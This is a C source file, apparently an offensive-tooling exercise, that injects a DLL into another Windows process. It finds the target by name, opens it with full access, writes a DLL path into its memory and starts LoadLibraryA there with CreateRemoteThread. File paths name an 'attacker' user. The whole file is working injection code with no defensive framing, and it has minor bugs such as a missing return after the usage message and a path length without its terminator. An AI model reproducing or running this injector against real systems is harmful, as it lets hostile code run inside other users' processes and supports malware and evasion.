#include <Windows.h>
#include <stdio.h>
#include "C:\Users\attacker\source\hiddenLib-main\info\info.h"
#include "listprocess.h"

#define MAX_SIZE 1024

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("%s %s <pid>", ERROR, argv[0]);
	}

	CHAR* cProcessName = argv[1];
	DWORD dwPid;
	HANDLE hProcess = NULL;
	LPCSTR lpDllName = "C:\\users\\attacker\\source\\repos\\dllmessage\\x64\\debug\\dllmessage.dll";
	DWORD dwSize = strlen(lpDllName);
	HMODULE hKernel32 = NULL;
	FARPROC fLoadLibraryAddress = NULL;
	CHAR* cBuffer = NULL;
	HANDLE hThread = NULL;
	SIZE_T sNumberBytesWritten;

	dwPid = ListProcess(cProcessName);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPid);
	if (hProcess == NULL) {
		printf("%s OpenProcess failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get handle for process %d at address: 0x%p\n", SUCCESS, dwPid, hProcess);

	hKernel32 = GetModuleHandleA("kernel32");
	if (hKernel32 == NULL) {
		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get handle for KERNEL32 at address: 0x%p\n", SUCCESS, hKernel32);

	fLoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
	if (fLoadLibraryAddress == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for LoadLibrary at: 0x%p\n", SUCCESS, fLoadLibraryAddress);

	cBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (cBuffer == NULL) {
		printf("%s VirtualAllocEx failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Allocated memory at address: 0x%p\n", SUCCESS, cBuffer);

	if (!WriteProcessMemory(hProcess, cBuffer, lpDllName, dwSize, &sNumberBytesWritten)) {
		printf("%s WriteProcessMemory failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Successfully writted %zu bytes in memory at address: 0x%p\n", SUCCESS, sNumberBytesWritten, cBuffer);

	hThread = CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)fLoadLibraryAddress, cBuffer, 0, NULL);
	if (hThread == NULL) {
		printf("%s CreateRemoteThread failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Launched thread at address: 0x%p\n", SUCCESS, hThread);

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}